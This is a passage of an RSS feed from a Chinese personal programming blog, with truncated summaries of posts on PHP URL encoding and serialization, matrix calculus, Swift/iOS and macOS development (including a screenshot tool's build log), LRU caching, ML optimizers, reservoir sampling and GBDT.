其中a的编码为%61，1的编码为%31，这个编码是十六进制数，以此类推。如果需要对编码再进行编码，则在前面加上25，如%61的编码为%2561。
也可以通过写一小段php来查看编码：
&amp;lt;?php echo dechex(ord(&amp;#39;a&amp;#39;)); // 输出61 &amp;gt; 有时也需要对base64进行解码：
&amp;lt;?php $str = &amp;#39;VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==&amp;#39;; echo base64_decode($str); ?&amp;gt; #序列化和反序列化
在php中，反序列化之前会执行__wakeup函数。
在我们对一个class的对象进行序列化后，可以得到一个形容它的字符串，比如：
&amp;lt;?php class Student{  public $name = &amp;#39;hello&amp;#39;;  public $score = 150;  public $grades = array();   function __wakeup() {  echo &amp;#34;__wakeup is invoked&amp;#34;;  } }  $s = new Student(); var_dump(serialize($s)); ?</description>
    </item>
    
    <item>
      <title>优化问题中的矩阵运算</title>
      <link>https://hagemon.github.io/posts/%E4%BC%98%E5%8C%96%E9%97%AE%E9%A2%98%E4%B8%AD%E7%9A%84%E7%9F%A9%E9%98%B5%E8%BF%90%E7%AE%97/</link>
      <pubDate>Thu, 03 Jun 2021 21:54:00 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E4%BC%98%E5%8C%96%E9%97%AE%E9%A2%98%E4%B8%AD%E7%9A%84%E7%9F%A9%E9%98%B5%E8%BF%90%E7%AE%97/</guid>
      <description>在一些非深度学习的方法中，目标函数由样本、权重的矩阵形式组成。假设样本集合矩阵为$X$，样本均值矩阵为$M$，权重矩阵为$W$，映射后的特征为$W^TX$，要令映射后的特征方差最大，则损失函数表示为：
$$\max_{W}||W^TX-W^TM||^2$$
L2 Norm与矩阵的迹 优化目标中带有L2 Norm的情况下求导计算比较复杂，可以将其转化为矩阵的迹的形式。假设有矩阵$A$：
$$A=\begin{pmatrix} a_1&amp;amp;a_2&amp;amp;a_3\\ b_1&amp;amp;b_2&amp;amp;b_3\\ c_1&amp;amp;c_2&amp;amp;c_3 \end{pmatrix}$$
则$A$的L2 Norm为
$$||A||^2=a_1^2+a_2^2+a_3^2+b_1^2+\cdots+c_3^2$$
而$A^TA$的主对角线为
$$A^TA=\begin{pmatrix} a_1^2+a_2^2+a_3&amp;amp;\cdots&amp;amp;\cdots\\ \cdots&amp;amp;b_1^2+b_2^2+b_3&amp;amp;\cdots\\ \cdots&amp;amp;\cdots&amp;amp;c_1^2+c_2^2+c_3 \end{pmatrix}$$
则可以将L2 Norm转化为矩阵的迹形式：
$$||A||^2=trace(A^TA)$$
并利用以下规则求导：
$$\frac{trace(A^TA)}{\partial A}=2A$$
最后令导数为0来计算参数矩阵。</description>
    </item>
    
    <item>
      <title>Swift实现简单的图像缓存</title>
      <link>https://hagemon.github.io/posts/swift%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E5%83%8F%E7%BC%93%E5%AD%98/</link>
      <pubDate>Sun, 28 Feb 2021 22:07:38 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/swift%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E5%83%8F%E7%BC%93%E5%AD%98/</guid>
      <description>在iOS App中，为了增加用户的体验感、减少网络的请求、增加App的性能，我们在获取图像之后通常会将其进行缓存，我学习了从零开始打造一个iOS图片加载框架，写了一个简单的基于Swift的图像缓存。
图片加载 我们从最简单的场景开始，在ViewController中实现download方法，通过URLSession下载一个图片并显示到ImageView上：
func download() {  let url = URL(string: &amp;#34;https://user-gold-cdn.xitu.io/2019/3/25/169b406dfc5fe46e&amp;#34;)  let session = URLSession.shared  let task = session.dataTask(with: url!, completionHandler: { [weak self]  data, res, error in  guard error == nil,  let data = data  else { return }  let image = UIImage(data: data)  guard let strongSelf = self else {return}  DispatchQueue.main.async {  strongSelf.imageView.image = image  }  })  task.</description>
    </item>
    
    <item>
      <title>GCD异步渲染UITableViewCell&#43;滚动优化</title>
      <link>https://hagemon.github.io/posts/gcd%E5%BC%82%E6%AD%A5%E6%B8%B2%E6%9F%93uitableviewcell&#43;%E6%BB%9A%E5%8A%A8%E4%BC%98%E5%8C%96/</link>
      <pubDate>Thu, 25 Feb 2021 22:16:05 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/gcd%E5%BC%82%E6%AD%A5%E6%B8%B2%E6%9F%93uitableviewcell&#43;%E6%BB%9A%E5%8A%A8%E4%BC%98%E5%8C%96/</guid>
      <description>在基于feed流的应用中，有两个需要重点解决的问题：
 异步进行耗时的数据加载 滚动时控制加载任务以保持滚动流畅  设定一个简单的场景：
 基于UITableViewCell 每个cell都拥有一个UIImageView 在UIImageView上绘制圆角头像 绘制100个cell并进行高频率的滚动  我们可以使用Instrument和XCode的Debugger里观察这些指标：
 Average Frame Time 是否离屏渲染  简单实现 最简单的实现方式是为每一个cell上的UIImageView设置cornerRadius，但是会存在离屏渲染，且AFT很长。 其实现在直接用png并设置cornerRadius并不会被离屏渲染，这里为了展示效果特地把layer栅格化一下😅
class TableViewController: UITableViewController {   override func viewDidLoad() {  super.viewDidLoad()  }   override func numberOfSections(in tableView: UITableView) -&amp;gt; Int {  return 1  }   override func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -&amp;gt; Int {  return 100  }    override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&amp;gt; UITableViewCell {  let cell = tableView.</description>
    </item>
    
    <item>
      <title>Clipin Log 7. 提升截屏流畅度</title>
      <link>https://hagemon.github.io/posts/clipin-post-7/</link>
      <pubDate>Wed, 24 Feb 2021 23:23:36 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-post-7/</guid>
      <description>旧版本 在之前的版本中，我在一个ClipView上对暗色背景和高亮区域绘制：
override func draw(_ dirtyRect: NSRect) {   super.draw(dirtyRect)   // Drawing code here.  guard let image = self.image, let drawingRect = self.drawingRect else {  return  }  image.draw(in: self.bounds, operation: .sourceOver, fraction: 0.5) // 绘制背景  var rect = NSIntersectionRect(drawingRect, self.bounds) // 取高亮区域和页面的交集区域  rect = NSIntegralRect(rect) // 区域取整，为了防止抖动问题   // 取屏幕图像中高亮区域部分渲染在view上，使用.sourceOver操作  // 由于source图像是alpha为1，所以渲染结果即是区域图像本身  image.draw(in: rect, from: rect, operation: .sourceOver, fraction: 1.</description>
    </item>
    
    <item>
      <title>Swift5：基于正则表达式实现简单的Markdown即时渲染</title>
      <link>https://hagemon.github.io/posts/swift5%E5%9F%BA%E4%BA%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84markdown%E5%8D%B3%E6%97%B6%E6%B8%B2%E6%9F%93/</link>
      <pubDate>Sat, 13 Feb 2021 23:23:44 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/swift5%E5%9F%BA%E4%BA%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84markdown%E5%8D%B3%E6%97%B6%E6%B8%B2%E6%9F%93/</guid>
      <description>本文以iOS下的UITextView为例，在MacOS上只要更改NSTextView的相应的接口名同样适用。
实现思路 我在实现过程中尝试了局部实时渲染和全局实时渲染的方式，由于学艺不精，暂时没有找到很好的方法进行局部实时渲染，这里介绍一下我对于两种方法的思路。
局部实时渲染 最早的思路是根据用户的输入位置对应的段落，更新NSMutableAttributedString，具体步骤如下：
 监听textViewDidChange 找到光标对应的段落 根据段落内容，基于正则表达式分析并对应文字的attribute  但是按照这种思路，在替换文字是会导致attribute的混乱。attribute的形式是属性:Range的形式，在更新了文本以后，所有的文本range位置都会发生变化。我暂时没有找到一个很方便的方法来局部更新NSMutableAttributedString的属性。
全局实时渲染 全局实时渲染指在监听文本变化后更新整个文本的attribute，这样会带来一些性能的损失，但是更易于实现。主要的思路如下：
 监听textViewDidChange 重新解析所有文字的attribute并更新  我们首先需要封装一个正则表达式的工具RE。
正则表达式工具RE RE的主要功能包括：
 匹配并获取Regex对应的内容 替换Regex所匹配的内容 匹配并获取Regex对应的内容及其范围(NSRange)  首先封装一个RE返回的结构体
struct Parsed {  var content: String  var range: NSRange } class RE: NSObject {  static func regularExpression(validateString:String, inRegex regex:String) -&amp;gt; [String]{  // 匹配并获取内容  do {  let re: NSRegularExpression = try NSRegularExpression(pattern: regex, options: [])  let matches = re.</description>
    </item>
    
    <item>
      <title>实现基于LRU的Cache</title>
      <link>https://hagemon.github.io/posts/%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8Elru%E7%9A%84cache/</link>
      <pubDate>Sat, 06 Feb 2021 22:58:25 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8Elru%E7%9A%84cache/</guid>
      <description>LRU需要满足：
 O(1)时间的读写 将最久未被使用的数据剔除 剔除操作在写入的时候进行  要满足这些条件，需要具备的数据结构特点：
 哈希表：O(1)读取 链表：最近被使用的在表头  所以使用双向链表+哈希表的组合作为cache结构。
Python简易实现 使用Python快速实现上述功能，包括数据结点、双向链表和Cache的实现。
数据结点 class Node:  def __init__(self, key, val):  self.next = None  self.prev = None  self.key = key  self.val = val 双向链表 class BidirectionalList:  def __init__(self):  self.head = None  self.tail = None   # 添加结点到链表头  def add_node(self, node):  # 链表为空时设置头尾节点  if not self.head:  self.head = node  self.</description>
    </item>
    
    <item>
      <title>Swift5&#43;CloudKit&#43;CoreData实现多终端同步</title>
      <link>https://hagemon.github.io/posts/swift5&#43;cloudkit&#43;coredata%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/</link>
      <pubDate>Thu, 04 Feb 2021 22:42:18 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/swift5&#43;cloudkit&#43;coredata%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/</guid>
      <description>CloudKit和CoreData的配置已经有很多资料了，这里不阐述。
Preparation 在基于CoreData和CloudKit的项目中，会在AppDelegate中自动生成container：
lazy var persistentContainer: NSPersistentContainer = {   let container = NSPersistentContainer(name: &amp;#34;Model&amp;#34;)   // get the default store description  guard let description = container.persistentStoreDescriptions.first else {  fatalError(&amp;#34;Could not retrieve a persistent store description.&amp;#34;)  }   // initialize the CloudKit schema  let id = &amp;#34;iCloud.your.id&amp;#34;  // 获取基于CloudKit的Options  let options = NSPersistentCloudKitContainerOptions(containerIdentifier: id)  description.cloudKitContainerOptions = options  // 用于跟踪merge的记录  description.</description>
    </item>
    
    <item>
      <title>Clipin Log 6. 多屏幕支持</title>
      <link>https://hagemon.github.io/posts/clipin-post-6/</link>
      <pubDate>Sat, 09 Jan 2021 21:44:43 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-post-6/</guid>
      <description>多屏幕环境 在多屏幕环境下，各个屏幕的起始坐标origin会根据用户在系统偏好设置中对显示器排列的设置而不同，下图直观地表示了多屏幕环境下各屏幕的坐标。
通过screen.visibleFrame可以访问屏幕在此坐标系下的frame。
实现思路  在ClipManager.shared.start()中检测所有屏幕并创建控制器 对于每个控制器，获取对应显示器当前页面图像 在执行Pin操作时，需要将窗口偏移到正确的位置  class ClipManager { 	// ....   var controllers: [ClipWindowController] = []  // ....  func start() {  NotificationCenter.default.post(name: NotiNames.pinNormal.name, object: nil)  NSApplication.shared.activate(ignoringOtherApps: true)   for screen in NSScreen.screens { // 获取所有屏幕  let view = ClipView(frame: screen.frame)  let clipWindow = ClipWindow(contentRect: screen.frame, contentView: view)  let clipWindowController = ClipWindowController(window: clipWindow)  controllers.append(clipWindowController)  self.status = .</description>
    </item>
    
    <item>
      <title>Clipin Log 5. 单屏幕Pin实现</title>
      <link>https://hagemon.github.io/posts/clipin-log-5/</link>
      <pubDate>Sat, 09 Jan 2021 21:41:18 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-5/</guid>
      <description>Pin功能的触发时机是在ClipManager的select状态下点击回车时，所以在ClipWindowController的done中，将bitmapRep和对应的rect作为参数，执行Pin操作
class ClipWindowController: NSWindowController { 	// ....  @objc func done() {  guard let view = self.clipView,  let rect = view.drawingRect  else {  return  }  guard let bitmapRep = view.bitmapImageRepForCachingDisplay(in: rect) else {return}  view.cacheDisplay(in: rect, to: bitmapRep)   // 利用bitmapRep进行Pin操作  PinManager.shared.pin(rep: bitmapRep, rect: rect)  }  	// ....  } PinManager单例 主要完成将图像作为一个新的窗口，并放置在屏幕顶层的操作，这里称为pin操作。源码里还实现了一些保存图像的函数，后续会在小工具中使用。
pin函数初始化了页面、窗口和控制器并显示窗口，在处理结束后发送pinEnd通知。
class PinManager: NSObject {  static let shared = PinManager()  var controllers: [PinWindowController] = []   func pin(rep: NSBitmapImageRep, rect:NSRect) {  let image = NSImage(size: rect.</description>
    </item>
    
    <item>
      <title>Clipin Log 4. 高亮区域的选取&amp;拖拽&amp;调整</title>
      <link>https://hagemon.github.io/posts/clipin-log-4/</link>
      <pubDate>Sat, 09 Jan 2021 21:25:34 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-4/</guid>
      <description>高亮区域的选取 确定了高亮区域的渲染方式后，我们在ClipWindowController中添加对鼠标事件的监听，用于获取高亮区域。
在ClipWindowController中设置一些变量，用来记录用户操作过程中的一些NSPoint和NSRect：
class ClipWindowController: NSWindowController {    var clipView: ClipView?  var screenImage: NSImage?   var lastRect: NSRect? // 上一个完整的区域，用于保存拖拽或调整前的区域  var highlightRect: NSRect? // 当前高亮的区域，通过鼠标操作动态更新  var startPoint: NSPoint? // 上一个完整区域的origin  var lastPoint: NSPoint? // 上一次更新区域时鼠标的位置   // functions .... } 实现思路：  鼠标落下时状态变为start，并记录落下位置为高亮区域的startPoint 鼠标拖拽时通过当前位置和startPoint创建新的Rect，用于更新highlightRect  其中用到mouseDown、mouseUp、mouseDrag这三个事件监听：
override func mouseDown(with event: NSEvent) {  let location = event.locationInWindow  switch ClipManager.shared.status {  case .</description>
    </item>
    
    <item>
      <title>Clipin Log 3. 截屏页面的实现</title>
      <link>https://hagemon.github.io/posts/clipin-log-3/</link>
      <pubDate>Sat, 09 Jan 2021 21:24:06 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-3/</guid>
      <description>实现思路  创建和屏幕大小相等的NSWindow，且拥有以下特性：  borderless contentview透明背景 level在其余窗口之上   捕捉高亮区域 重载NSWindow.contentView中的draw方法，渲染高亮区域的图像覆盖背景 按下ESC退出Clip 按下Enter完成对高亮区域图像的获取 用NSWindowController控制以上行为  实现过程 创建NSWindowController，NSWindow，NSView对应的子类。
在ClipManager.shared.start()中创建控制器、窗口和页面的对象并建立关系：
func start() { 	guard let screen = NSScreen.main else { return } // 单显示器环境 	NSApplication.shared.activate(ignoringOtherApps: true) // 在触发快捷键后激活App，使开启的窗口能够变为key window  let view = ClipView(frame: screen.frame)  let clipWindow = ClipWindow(contentRect: screen.frame, contentView: view)  let clipWindowController = ClipWindowController(window: clipWindow)  self.controllers.append(clipWindowController) // 将其加入当前保存的控制器中  self.status = .ready  clipWindowController.capture(screen) } ClipWindow的条件在初始化时既可以满足：</description>
    </item>
    
    <item>
      <title>Clipin Log 2. 截屏管理器</title>
      <link>https://hagemon.github.io/posts/clipin-log-2/</link>
      <pubDate>Sat, 09 Jan 2021 21:13:22 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-2/</guid>
      <description>Manager/ClipManager.swift
截屏状态 enum ClipStatus {  case off // 未开启  case ready // 就绪  case start // 开始选择区域  case select // 已选择区域  case adjust // 调整区域大小  case drag // 拖拽区域 } 截屏的状态转移可以表述为下图
单例 使用单例来控制Clip的操作：
import Cocoa  class ClipManager {   static let shared = ClipManager() // 单例  var status: ClipStatus = .off // Clip初始状态 	var controllers: [ClipWindowController] = [] // 保存当前打开的所有控制器   private init() {  NotificationCenter.</description>
    </item>
    
    <item>
      <title>Clipin Log 1. 基于Status Bar的应用&amp;监听快捷键</title>
      <link>https://hagemon.github.io/posts/clipin-log-1/</link>
      <pubDate>Sat, 09 Jan 2021 20:53:34 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-1/</guid>
      <description>创建一个基于Status Bar的应用 基于Status Bar的应用不需要设置额外的UI，所以不需要使用StoryBoard，只要在AppDelegate中配置好相应的StatusBarItem即可。
Storyboard 由于是基于Status Bar的应用，所以在Storyboard中将页面相关的组件都删除了，保留了Menu相关的组件。
配置info.plist 在info.plist中添加名为Application is agent (UIElement)的key，并将value值设置为YES。这样App就不会在Dock中显示
AppDelegate 在AppDelegate中创建StatusBar按钮并配置对应的action
import Cocoa  @main class AppDelegate: NSObject, NSApplicationDelegate {   let statusItem = NSStatusBar.system.statusItem(withLength:NSStatusItem.squareLength)   func applicationDidFinishLaunching(_ aNotification: Notification) {  guard let button = self.statusItem.button else { return }  button.image = NSImage(named: NSImage.Name(&amp;#34;StatusBarIcon&amp;#34;)) // StatusBarIcon is in Assets.xcassets  button.action = #selector(showMenu)  }   func applicationWillTerminate(_ aNotification: Notification) {  // Insert code here to tear down your application  }   @objc func showMenu() {//to be do} } 监听快捷键 基于HotKey实现对全剧快捷键的监听，HotKey底层使用了Carbon的RegisterEventHotKey接口：</description>
    </item>
    
    <item>
      <title>Clipin Log 0. Mac OS上截图&amp;保留小工具的开发记录</title>
      <link>https://hagemon.github.io/posts/clipin-log-0/</link>
      <pubDate>Sat, 09 Jan 2021 20:50:05 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-log-0/</guid>
      <description>源码地址：https://github.com/hagemon/Clipin
源码的版本为Swift 5.0。
我们将截图操作称为Clip，将截图钉在屏幕上的操作称为Pin。
该工具可以临时将一些需要对照的信息保持在屏幕最上方，（或许）能提高工作效率。
该工具在很大程度上参考了Snip的源码，且集成了HotKey开源库监听快捷键。
本文章是作者在开发该工具过程中的记录，由简入繁地介绍该工具的创建过程，如文中有纰漏或是不健康的代码，还请各位赐教。😋
本工具还会持续地开发和维护，该文章也会不断地更新和修改。
项目架构介绍 根据作者个人的习惯，将项目分为以下几个模块：
 Util：一些工具类、函数、枚举和扩展 Manager：管理Clip、Pin操作过程的单例管理器 Clip：Clip功能相关的Controller和View Pin：Pin功能相关的Controller和View  Status bar应用的相关配置和快捷键监听等功能在AppDelegate.swift中实现。
首先进入Status Bar应用&amp;amp;监听快捷键。</description>
    </item>
    
    <item>
      <title>优化方法总结</title>
      <link>https://hagemon.github.io/posts/%E4%BC%98%E5%8C%96%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</link>
      <pubDate>Sat, 24 Aug 2019 11:47:27 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E4%BC%98%E5%8C%96%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</guid>
      <description>总结一下机器学习中常见的各种优化器。
Batch Gradient Descent(BGD) BGD对整个数据集计算梯度，当数据集很大时所需要的计算资源就很大，如果目标函数是凸函数，则可以找到全局最优解，否则找到局部最优解。
Stochastic Gradient Descent (SGD) 和BGD相反，SGD一次只使用一个样本来对参数进行更新，速度很快，但是可能由于数据集中的噪声导致其每次更新并不一定能往最优的方向更新，准确度有所下降。并且因为更新频繁，导致损失函数会有很大的动荡
Mini-batch Stochastic Gradient Descent (MSGD) MSGD是SGD和BGD的一个折中，每次使用一个小批量的数据来更新权重（批大小一般取50-256）。这样可以降低梯度更新时的方差，相对于SGD，有更稳定的效果；相对于BGD，又更加地高效。
但是MSGD需要对学习率有一个合理的设定，否则不能保证很好的收敛。当学习率太大时可能会导致震荡比较大，学习率小时会导致其被困在局部最优解。
当数据较为稀疏时，即每个样本中很多的特征取值为0或接近0。由于学习率对于所有的参数都是一致的，对于稀疏特征对应的参数，每次更新的幅度就很小。
Momentum 当曲面的某个方向比别的方向更陡时，SGD会倾向于往更陡的方向更新（因为负梯度的方向），而不是往一个更优的方向更新。
动量随机梯度下降在更新梯度的时候增加了一个动量项，表示上一次更新动量的改变值：
$$v_t=\gamma v_{t-1}+\eta\nabla_\theta f(\theta)$$
$$\theta_t=\theta_{t-1}-v_t$$
对于梯度的不同维度（即梯度向量的某个分量），每一次的更新都会有一定的积累。具体来说，梯度的每一次更新包括两部分，一是当前的梯度$\nabla_\theta f(\theta)$，另一个是之前所有更新的加权和$\gamma v_{t-1}$。由于$0&amp;lt;\gamma&amp;lt;1$的存在，之前的更新$v_1, v_2, v_3\dots$在$v_t$中所占的权重会不断减小，且下降的速度是指数级的。
若$v_{t-1}^{(i)}$是正值，表示梯度在往偏向这个分量的方向移动。定义$v_0=0$，则$v_1$就是第一次的梯度值。若梯度在某个分量上不断提供正值，那么这个分量的增幅就会越来越快，这就和自由落体运动中的加速度一样。若梯度不断提供负值，则其增幅就会不断减少，甚至会往负方向增加。若梯度的提供的值在正负间摇摆，即出现振荡的现象，则它们的动量部分会相互抵消，在此维度的更新步伐就会减缓。
回到曲面某个方向比别的方向更陡的情况，举个例子，就好像我们的损失函数的曲面是一根水管内部的面，如果我们的水管自然下垂到地面，那么沿着水流的方向就会比较能快速到达地面（也就是函数的最低点），然而因为两侧的水管壁比较陡峭，SGD方法就会倾向于在水管壁之间左右横跳。如果使用了Momentum，那么左右横跳的时候会抵消动量，让该方向的变换减小，而由于同时在一点点的往水流方向前进，水流方向的梯度变化就会不断增加，从而更快到达最低点。
按经验来说$\gamma=0.9$
Nesterov Accelerated Gradient NAG不仅做了梯度的累积，而且还考虑到了未来可能方向上的情况，从而可以在将要遇到损失上升的地方时减缓速度。
NAG在计算梯度变化时，使用的是预估的梯度，也就是假设参数会往当前的累积量的方向变化
$v_t=\gamma v_{t-1}+\eta\nabla_\theta f(\theta-\gamma v_{t-1})$
Adagrad Ada系的梯度更新方法，主要目的是对不同重要性的特征对应的权重，进行不同程度的更新。主旨思想是对低频特征的权重进行较大的更新，对高频特征的权重进行较小的更新，这样使得各个特征的影响力稍微平衡一些。其表现形式为：
$$\theta_{i,t}=\theta_{i,t-1}-\frac{\eta}{\sqrt{G_{ii}+\epsilon}}\nabla_{\theta_i}f(\theta)$$
其中$G$是一个主对角矩阵，$G_{ii}$表示参数的第i个分量在t之前的梯度平方和。当$G_{ii}$较小的时候，即之前梯度变换较少的特征，会逐渐增加其步长，反之减少步长。
Adagrad的优势是免去了超参数$\eta$的调节，在经验情况下$\eta=0.01$
但是在分母不断积累的过程中，其学习率就会收缩，最终变得非常小。
Adadelta Adadelta对Adagrad的问题进行了改进，将分母转变为梯度的均方根，这样得到的就是更新过程中权重的平均变化。同时把学习率$\eta$换成了梯度值增量的均方根，所以也不用设置学习率了。对于均方根的更新，它设定为：
$$E[g^2]t=\gamma E[g^2]{t-1}+(1-\gamma)g_t^2$$
权重更新表示为：
$$\Delta \theta_t=-\frac{E[\Delta\theta^2]_{t-1}}{E[g^2]_t}$$
一般把$\gamma=0.9$
RMSprop RMSprop表示为：
$$v_t=\gamma v_{t-1}+(1-\gamma)g_t^2$$
$$\Delta w_t=-\frac{\eta}{\sqrt{v_t+\epsilon}}g_t$$
注意到这里计算新的梯度变化量的时候使用了平方，当梯度朝不同方向动荡的时候，这个值一直会保持很大，相当于考虑了变化的大小，而不动荡的梯度方向就会产生很小的值。这在计算权重改变值的时候能发挥作用，当一个梯度变化动荡的时候分母值会很大，导致权重变化就减少了，就减少了该方向的动荡程度。
Adam Adam结合了RMSprop和Momentum。RMSprop减弱了在震荡方向上的梯度变换，但是降低了该方向的搜索能力；Momentum则很好的累积了之前的梯度变换，在梯度方向变换不大的情况下能促使梯度往更优的方向变化。Adam综合了这两者的特性，有如下的定义：
$$v_t=\beta_1 v_{t-1}+(1-\beta_1)*g_t$$
$$s_t=\beta_2 s_{t-1}+(1-\beta_2)*g_t^2$$
$$\Delta w_t=-\eta \frac{v_t}{\sqrt{s_t+\epsilon}}*g_t$$</description>
    </item>
    
    <item>
      <title>蓄水池算法</title>
      <link>https://hagemon.github.io/posts/%E8%93%84%E6%B0%B4%E6%B1%A0%E7%AE%97%E6%B3%95/</link>
      <pubDate>Fri, 23 Aug 2019 11:47:27 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E8%93%84%E6%B0%B4%E6%B1%A0%E7%AE%97%E6%B3%95/</guid>
      <description>在长度未知的数据流中，要如何采样k个样本，使得这k个样本被采样的概率是相同的？
面试中被问到的一个问题，当时没有很好地理解题目。仔细一想这个问题的应用还是很广泛的，比如要在大量级的点击事件数据流中采样点击事件，从而从事件中获得一些特征，那么为了保证采样的公平性，使得获得的特征更加客观，就需要采样时所有的样本被获取的概率是一样的。
问题描述 设定一个长度为k的数组，目的是为了保证这k个数据在数据流不断流入的情况下，他们被选中到这个数组里的概率是一样的。
对于前k个流入的数据，都会被直接选中，所以直接放到数组里，它们的概率是1。
为了保证数据流抽样的概率相等，数组中的数据随时可能被替换，即我们要保证新来的数据n被选中的概率和池子里的数据保留的概率都是$\frac{k}{n}$。
对于前k个数据，他们在数据量小于k时会一直存在于数组中，若数据量一旦大于k，则它们有可能被替换。当第k+1个数据流入时，新数据被采样到数组里的概率是$\frac{k}{k+1}$，这也是一旦数组中某个元素被选中，它就以这个概率被替换；那么数组中某个元素被选中的概率自然是$\frac{1}{k}$，所以某个元素被选中且替换的概率是$\frac{1}{k}*\frac{k}{k+1}=\frac{1}{k+1}$，则它留下来的概率是$\frac{k}{k+1}$。同理，当第k+2个数据流入时，它被留下来的概率是$\frac{k+1}{k+2}$。那么当有n个数据流入时，它依然还在数组中的概率是：
$$1*\frac{k}{k+1}\frac{k+1}{k+2}\cdots\frac{n-1}{n}=\frac{k}{n}$$
对于k之后的数据j，它被选中到数组里的概率是$\frac{k}{j}$，若它被选中了，则它不被下一个数据替换的概率是$1-\frac{k}{j+1}*\frac{1}{k}=\frac{j}{j+1}$，同理，若其没有被替换，则第j+2个数据流入时没有被替换的概率是$\frac{j+1}{j+2}$，那么它被保留的概率是：
$$\frac{k}{j}\frac{j}{j+1}\cdots*\frac{n-1}{n}=\frac{k}{n}$$
所以所有数据被保留的概率都是$\frac{k}{n}$。
对于实现来说，当有一个新数据时，在当前数据长度的范围内随机选择一个数m，若它小于等于k，则数组中m位置的数字会被新数字替换。
参考资料 [用Python写算法 | 蓄水池算法实现随机抽样](</description>
    </item>
    
    <item>
      <title>GBDT中对于梯度拟合的理解</title>
      <link>https://hagemon.github.io/posts/gbdt%E4%B8%AD%E5%AF%B9%E4%BA%8E%E6%A2%AF%E5%BA%A6%E6%8B%9F%E5%90%88%E7%9A%84%E7%90%86%E8%A7%A3/</link>
      <pubDate>Tue, 20 Aug 2019 20:05:27 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/gbdt%E4%B8%AD%E5%AF%B9%E4%BA%8E%E6%A2%AF%E5%BA%A6%E6%8B%9F%E5%90%88%E7%9A%84%E7%90%86%E8%A7%A3/</guid>
      <description>为什么在优化GBDT时，要让当前的学习器去拟合一个负梯度呢？
在梯度提升决策树（Gradient Boosting Decision Tree, GBDT）中，当前学习器的拟合对象是自定义损失函数$L(y_i,\hat{y}_i^{t-1})$对于上一个学习器的输出$\hat{y}_i^{t-1}$的负梯度，即
$$-\frac{\partial{L(y_i,\hat{y}_i^{t-1})}}{\partial{\hat{y}_i^{t-1}}}$$
在自定义损失函数为均方误差函数时，这个负梯度恰好是学习器和标签之间的残差
$$-\frac{\partial{(y_i-\hat{y}_i^{t-1})^2}}{\partial{\hat{y}_i^{t-1}}}=2(y_i-\hat{y}_i^{t-1})$$
很多文章并没有对为什么要拟合负梯度这个问题给出一个详细的解释，很多人解释说是为了能够应对自定义的损失函数才使用了负梯度来代替残差。但是实际上，恰恰是因为使用了负梯度来拟合当前学习器的输出，才导致了在特殊情况下（使用均方误差作为损失函数的情况），学习器拟合的是残差。
所以为什么使用的是负梯度，而不是别的什么值呢？个人觉得这和梯度下降的原理十分的类似，我们从梯度下降开始说起。
梯度下降法的原理 在我们最早接触的高等数学里，假设有一个固定参数$\theta$的函数$f(x;\theta )=\theta_1 x^2+\theta_2x$，我们要求得这个函数的最小值，则要对$f(x)$关于变量$x$求导，找到导数为0的点，即在变量空间中找到一个值使得函数最小。
后来我们接触了机器学习，我们要求解的目标从自变量$x$变成了我们模型的参数$\theta$，目的也从在变量空间中找$x$变成了在参数空间中找到一个$\theta$，使得对于所有的训练数据$x$，我们的目标函数（也就是损失函数）值能最小。
我们经常使用的一个方法就是梯度下降法，它的形式为：
$$\theta_{t}=\theta_{t-1}-\eta\frac{\partial f(\theta_{t-1})}{\partial \theta_{t-1}}$$
我在这里增加了一个时间下标，主要是为了区分更新前后的$\theta$。
其实梯度下降是由泰勒一阶展开推导而来的，或者也可以从导数的定义来解释（这里以单变量为例，所以是导数，推广到多变量就可以变成梯度）
假设当前的参数为$\theta_{t-1}$，我们要求解的下一个参数为$\theta_{t}$，那么当两者之间的距离很小的时候，就可以通过导数的概念得出以下的式子：
$$\frac{f(\theta_{t})-f(\theta_{t-1})}{\theta_{t}-\theta_{t-1}}= f’(\theta_{t-1})$$
整理一下，可得
$$f(\theta_{t})-f(\theta_{t-1})=(\theta_{t}-\theta_{t-1})f&amp;rsquo;(\theta_{t-1})$$
其实这个公式整理一下就是泰勒一阶展开，这里的$(\theta_{t}-\theta_{t-1})$是一个向量，表示我们的参数向量，我们可以把它改写成标量*单位向量的形式：
$$(\theta_{t}-\theta_{t-1})=\eta e$$
我们优化的目标是让更新参数后的函数值比更新前的函数值小，即
